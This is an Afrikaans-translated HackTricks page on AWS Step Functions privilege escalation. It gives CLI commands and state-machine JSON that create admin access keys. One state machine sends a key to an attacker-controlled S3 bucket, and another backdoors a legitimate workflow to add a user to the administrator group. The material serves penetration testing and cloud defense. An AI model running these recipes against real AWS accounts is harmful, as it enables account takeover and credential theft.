# AWS - Step Functions Privesc

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Step Functions

Vir meer inligting oor hierdie AWS-diens, kyk:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

'n Aanvaller met die **`states:TestState`** & **`iam:PassRole`**-permissies kan enige staat toets en enige IAM-rol daaraan oorhandig sonder om 'n bestaande staatmasjien te skep of op te dateer, wat ongemagtigde toegang tot ander AWS-diens met die rolle se toestemmings moontlik maak. Gekombineer kan hierdie toestemmings lei tot omvattende ongemagtigde aksies, van die manipuleer van werkstrome om data te verander tot data-oortredings, hulpbronmanipulasie, en voorregopgang.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Die volgende voorbeelde toon hoe om 'n toestand te toets wat 'n toegangssleutel vir die **`admin`**-gebruiker skep deur van hierdie regte en 'n toegeeflike rol van die AWS-omgewing gebruik te maak. Hierdie toegeeflike rol behoort enige ho√´-bevoorregte beleid wat daarmee geassosieer word te h√™ (byvoorbeeld **`arn:aws:iam::aws:policy/AdministratorAccess`**) wat die toestand toelaat om die **`iam:CreateAccessKey`**-aksie uit te voer:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Opdrag** uitgevoer om die privesc uit te voer:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potensi√´le Impak**: Onbevoegde uitvoering en manipulasie van werkstrome en toegang tot sensitiewe bronne, wat moontlik kan lei tot beduidende veiligheidskendings.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

'n Aanvaller met die **`states:CreateStateMachine`** & **`iam:PassRole`** sou in staat wees om 'n staatmasjien te skep en enige IAM rol daaraan toe te ken, wat onbevoegde toegang tot ander AWS-diens met die rolle se regte moontlik maak. In teenstelling met die vorige privesc-tegniek (**`states:TestState`** & **`iam:PassRole`**), voer hierdie een nie self uit nie, jy sal ook die **`states:StartExecution`** of **`states:StartSyncExecution`** regte nodig h√™ (**`states:StartSyncExecution`** is **nie beskikbaar vir standaard werkstrome nie**, **net vir uitdrukkingsstaatmasjiene**) om 'n uitvoering oor die staatmasjien te begin.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Die volgende voorbeelde toon hoe om 'n toestandmasjien te skep wat 'n toegangssleutel vir die **`admin`**-gebruiker skep en hierdie toegangssleutel na 'n aanvaller-beheerde S3-emmer eksfiltreer, deur hierdie regte en 'n toegeeflike rol van die AWS-omgewing te benut. Hierdie toegeeflike rol behoort enige ho√´-bevoorregte beleid daarmee geassosieer te h√™ (byvoorbeeld **`arn:aws:iam::aws:policy/AdministratorAccess`**) wat die toestandmasjien toelaat om die **`iam:CreateAccessKey`** & **`s3:putObject`** aksies uit te voer.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Opdrag** uitgevoer om die **staatmasjien te skep**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Opdrag** uitgevoer om 'n **uitvoering te begin** van die voorheen geskepte staatmasjien:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

Die aanvaller-beheerde S3-emmer moet toestemmings h√™ om 'n s3:PutObject-aksie van die slagofferrekening te aanvaar.

{% endhint %}

- **Potensi√´le Impak**: Onbevoegde uitvoering en manipulasie van werkstrome en toegang tot sensitiewe bronne, wat moontlik kan lei tot beduidende veiligheidskendings.

### `states:UpdateStateMachine` & (nie altyd vereis nie) `iam:PassRole`

'n Aanvaller met die **`states:UpdateStateMachine`**-toestemming sou die definisie van 'n staatmasjien kan wysig, deur ekstra sluipende state by te voeg wat tot 'n voorregopgradering kan lei. Op hierdie manier, wanneer 'n regmatige gebruiker 'n uitvoering van die staatmasjien begin, sal hierdie nuwe skadelike sluipende staat uitgevoer word en die voorregopgradering sal suksesvol wees.

Afhanklik van hoe inskiklik die IAM Rol wat aan die staatmasjien gekoppel is, is, sou 'n aanvaller 2 situasies te√´kom:

1. **Inskiklike IAM Rol**: As die IAM Rol wat aan die staatmasjien gekoppel is reeds inskiklik is (dit het byvoorbeeld die **`arn:aws:iam::aws:policy/AdministratorAccess`**-beleid geheg), dan sou die **`iam:PassRole`**-toestemming nie vereis word om voorregte op te gradeer nie aangesien dit nie nodig sou wees om ook die IAM Rol op te dateer nie, die staatmasjien-definisie is genoeg.
2. **Nie inskiklike IAM Rol**: In teenstelling met die vorige geval, sou 'n aanvaller hier ook die **`iam:PassRole`**-toestemming benodig aangesien dit nodig sou wees om 'n inskiklike IAM Rol aan die staatmasjien te koppel bo en behalwe om die staatmasjien-definisie te wysig.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Die volgende voorbeelde wys hoe om 'n regte toestandmasjien op te dateer wat net 'n HelloWorld Lambda-funksie aanroep, ten einde 'n ekstra toestand by te voeg wat die gebruiker **`unprivilegedUser`** by die **`administrator`** IAM-groep voeg. Op hierdie manier, wanneer 'n regmatige gebruiker 'n uitvoering van die opgedateerde toestandmasjien begin, sal hierdie nuwe skadelike sluipende toestand uitgevoer word en die voorreg-escalasie suksesvol wees.

{% hint style="warning" %}

As die toestandmasjien nie 'n toelaatbare IAM Rol geassosieer het nie, sou dit ook die **`iam:PassRole`** toestemming benodig om die IAM Rol op te dateer ten einde 'n toelaatbare IAM Rol te assosieer (byvoorbeeld een met die **`arn:aws:iam::aws:policy/AdministratorAccess`** beleid geheg).

{% endhint %}

{% tabs %}

{% tab title="Regte Toestandmasjien" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Boosaardige Opgedateerde Staatmasjien" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
- **Opdrag** uitgevoer om die regmatige toestandmasjien **op te dateer**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potensi√´le Impak**: Onbevoegde uitvoering en manipulasie van werkstrome en toegang tot sensitiewe bronne, moontlik lei tot beduidende veiligheidskendings.

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
